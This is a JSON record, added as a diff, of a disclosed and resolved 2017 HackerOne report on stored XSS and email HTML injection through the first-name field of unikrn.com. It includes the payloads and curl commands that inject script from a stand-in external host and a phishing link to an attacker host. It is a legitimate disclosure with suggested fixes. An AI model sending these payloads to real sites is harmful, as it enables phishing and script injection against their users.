@@ -1,0 +1,207 @@
+{
+  "id": 262004,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjIwMDQ=",
+  "url": "https://hackerone.com/reports/262004",
+  "title": "HTML injection in email in unikrn.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-08-21T16:32:04.749Z",
+  "submitted_at": "2017-08-21T16:32:04.749Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "codebrained",
+    "url": "/codebrained",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/7fw1qrn724pzzvsf13m2dtoedxcf/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 2672,
+    "url": "https://hackerone.com/unikrn",
+    "handle": "unikrn",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Unikrn",
+      "twitter_handle": "unikrnco",
+      "website": "https://unikrn.com",
+      "about": "unikrn offers a world class comprehensive esports betting platform"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-08-23T08:21:40.908Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2017-08-23T08:20:42.012Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report! **Please add the affected domain name in the Title of the report.**\n\n**Summary:** Referral emails sent from unikrn.com are vulnerable to HTML injection via the first name field.\n\n**Description:** Due to a lack of sanitization and validation when posting to https://unikrn.com/apiv2/user/verify a user may set a number of profile fields to values which should not be acceptable. This allows for a possible XSS within the raffle areas of the website and HTML injection within the referral email sent by unikrn.com.\n\nThe user may insert a payload into the firstname field which is later used to generate the users 'callsign'. The callsign value is safely used in other locations in the site within ng-bind attributes however in the case of viewing a raffle winner, the value is instead transformed by the 'vartrans' directive. This directive permits html to be inserted as part of the \"raffle_winner_sidebar_body\" text and is done so without any sanitization. \n\nTherefore should a user set their first name as '<script src=\\\"https://external.com/xss.js\\\" />' when the user wins a raffle, any visitor to that raffles page will result in the external script being loaded.\n\nAlongside this XSS it was also found that should a user set their first name to a value containing a script tag, when a referral email is sent to an address, any email content after the script tag is ignored. As the field's maximum length is 256 characters, an attacker would have 248 characters to craft a malicious email or instead embed an image with the email content to allow for a larger word count. \n\nAn example payload may be \n<a href=\\\"https://attacker/phish.php\\\"><img src=\\\"https://attacker/content.jpg\\\"></a><script>\n\n\nRemedies for this would include proper sanitization of user fields when processed by the verify page and when passed as arguments to the vartrans directive to prevent similar issues in future, as well as a more strict content security policy and the stripping of all html characters when using user input within parameters to be used within an email.\n\n## Steps To Reproduce:\n## XSS:\n  1. Use the provided curl command to set a users first name to an xss payload such as <script src=\\\"https://external2.com/xss.js\\\" />\n  2. Win a raffle\n  3. Visit the raffles page once you have been announced as a winner.\n## Email HTML Injection:\n 1. Use the provided curl command to set a users first name to a payload such as <a href=\\\"https://attacker/phish.php\\\"><img src=\\\"https://attacker/content.jpg\\\"></a><script>\n2. Navigate to the profile page and send a referral email.\n\n## Supporting Material/References:\n\nXSS\n* curl -i -s -k  -X $'POST' -H $'Content-Type: application/json' --data-binary $'{\\\"country\\\":\\\"GB\\\",\\\"firstname\\\":\\\"<script src=\\\\\\\"https://external2.com/xss.js\\\\\\\" />\\\", \\\"session_id\\\":\\\"SESSION_ID\\\"}'  $'https://unikrn.com/apiv2/user/verify'\n\nEmail HTML Injection\n* curl -i -s -k  -X $'POST' -H $'Content-Type: application/json' --data-binary $'{\\\"country\\\":\\\"GB\\\",\\\"firstname\\\":\\\"<a href=\\\\\\\"https://attacker/phish.php\\\\\\\"><img src=\\\\\\\"https://attacker/content.jpg\\\\\\\"></a><script>\\\", \\\"session_id\\\":\\\"SESSION_ID\\\"}'  $'https://unikrn.com/apiv2/user/verify'\n\n\n",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 214633,
+      "file_name": "Email_Content.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/214/633/f688b02ab2ed1deb61824abf48a58f8d42c2f920/Email_Content.png?response-content-disposition=attachment%3B%20filename%3D%22Email_Content.png%22%3B%20filename%2A%3DUTF-8%27%27Email_Content.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7ZQ64IHF%2F20260708%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260708T062343Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIH66ULUjNnS2co8ugkBObjEHglx5O5HYemXAeKU1Dp4tAiAXF6poxlhlK74A3pJSywfr3Zei1lEgAKuKLxI%2Fxix4RyqyBQh%2FEAMaDDAxMzYxOTI3NDg0OSIMaCZn4A7FqO0L88uMKo8F2P2iUNosIbgYaH9qJTfgmFQmbaO1yPBWMdDbSrot%2Fh5BHJ%2FLJzrSCrSOOTBv9vkmRYCCQr6%2B%2FGc7eSoHHY%2Fg9KKE0aNe84VPmXShj2UBhPuZGGShOJbG78Gqp%2BfQuDUH0AAjYSMLUbDNknlnGj16IxXkyL5wwQgyGJKz%2Fv3Vje32bIxUKL5N1Ht624C0eOcrW8yUiXfCrm3%2BDNqAcA1Dep6s3RUTJCk%2BhaWiFGvg5IFaxhv%2Bg16QlhH50de95%2BXHVKq9PIgF8PrfcPb5oKyU%2BPjmvFFdhT8qbuinulc%2BQK4rt8PMFV9uYtfAxcOuF0j13fZiOeYBvSZUT5yvMqUyhXQ2ZOsfrj7TQRqINYvpCL89RH5NZx9x%2BnyhcZyXgD9ZCRNKkgu61C6tUPfEvKmfdrKyiLQ4XMo6zSqACbjIBFo2WF5Dtk0ybZDOfpbmxf00XeD%2FGtf3nPjbiGzLJe38nBvMant%2BMJBdM1CIwwGWvS9Bre9RuOo2iOBINoXV%2FqcSjM7At%2FYWVo6tcx6lN%2Be7tTz8vMX9U7tD61%2BfSWq0PphzCSLsCexOQvL%2Fgy4vpvHeEuai8K793hoeQ%2BAGt2PaHFNzJ%2FTpG%2BOvt%2FFNrrq15dMwC4YqDq%2BQ5W%2FyuoClSRyU5aBKI9xlFsQuIg4VrgzUjIxFFngYBeIxBa%2B5ako7%2BdJnrPpsvNmWaJTZbBC1WOeAGq%2Frm8LGvnPpUQDG7OUgIG%2FtTqnKxRpAkBKmZo%2BcbN0JThKkd2XUdnNxSphUTSdmuEqgQ9dHFPx%2FiSwyKNlyZFH68CWXW4F7b0glV33eAdG4e3QIp4TCvtPjEeWMrrk8DUIvGpUbimuKmwBYGrJIspJUbPXc6y9M2sFqBYnF0DDJy7fSBjqyAchyFc4ea2IppZTorm6qat7%2F97hfwMJSSCZZp3eNGFh1bL5WlLyfY22jrLJFGMuXCk4vSye5j3X78XEsRVu8jkeegmL8pYROGepMrrj%2BafytPOmYXXwmV65dEyj00hxGZGaBH4pz7vtdNQnUcA4ZcCE0jE4ryzgHhjaqQQJsDTkzMb0TgYA%2BOYnLs%2Fn%2B2XsCr%2B79DO3BbNAVEqotswkh1pm0SKyeFLdOhP8THcbN6t3SIPc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=d371124ddda98c5512af9b2945ffad59a5f22f6ac25af7fce735dc9fe8730609",
+      "file_size": 92457,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-09-22T08:20:42.078Z",
+  "allow_singular_disclosure_after": -277423381.36607957,
+  "singular_disclosure_allowed": true,
+  "vote_count": 18,
+  "voters": [
+    "flamezzz",
+    "jr0ch17",
+    "jensec",
+    "bl4de",
+    "flashdisk",
+    "savitar0x01",
+    "h4x0r_dz",
+    "fa1rlight",
+    "r3y",
+    "eveeez",
+    "and 8 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 453,
+    "asset_type": "URL",
+    "asset_identifier": "unikrn.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ],
+  "databaseId": "262004",
+  "votes": 18,
+  "latest_disclosable_activity_at": "2017-08-23T08:21:40.884Z",
+  "_metadata": {
+    "saved_at": "2026-07-08T14:23:43.559578",
+    "source": "https://hackerone.com/reports/262004.json",
+    "report_id": 262004
+  },
+  "_graphql_detail": {
+    "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjIwMDQ=",
+    "databaseId": "262004",
+    "title": "HTML injection in email in unikrn.com",
+    "url": "https://hackerone.com/reports/262004",
+    "state": null,
+    "substate": "resolved",
+    "disclosed_at": "2017-08-23T08:21:40.908Z",
+    "created_at": "2017-08-21T16:32:04.749Z",
+    "submitted_at": null,
+    "weakness": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1dlYWtuZXNzLzU4",
+      "name": "Command Injection - Generic",
+      "external_id": "cwe-77"
+    },
+    "severity": {
+      "rating": "high",
+      "score": null
+    },
+    "reporter": {
+      "username": "codebrained"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzI2NzI=",
+      "handle": "unikrn",
+      "name": "Unikrn",
+      "url": "https://hackerone.com/unikrn",
+      "currency": "usd"
+    },
+    "bounties": {
+      "edges": [
+        {
+          "node": {
+            "id": "Z2lkOi8vaGFja2Vyb25lL0JvdW50eS81ODUwMg==",
+            "amount": "0.00",
+            "awarded_amount": "0.00",
+            "awarded_bonus_amount": "0.00",
+            "created_at": "2017-08-21T20:39:19.222Z"
+          }
+        }
+      ]
+    }
+  },
+  "_hacktivity": {
+    "__typename": "HacktivityDocument",
+    "id": "Z2lkOi8vaGFja2Vyb25lL0NvbXBsZXRlSGFja3Rpdml0eVJlcG9ydEluZGV4LzI2MjAwNA==",
+    "_id": "262004",
+    "disclosed": true,
+    "votes": 18,
+    "latest_disclosable_activity_at": "2017-08-23T08:21:40.884Z",
+    "report": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjIwMDQ=",
+      "databaseId": "262004",
+      "title": "HTML injection in email in unikrn.com",
+      "url": "https://hackerone.com/reports/262004",
+      "disclosed_at": "2017-08-23T08:21:40.908Z"
+    },
+    "team": {
+      "id": "Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzI2NzI=",
+      "handle": "unikrn",
+      "name": "Unikrn",
+      "url": "https://hackerone.com/unikrn",
+      "currency": "usd"
+    }
+  }
+}
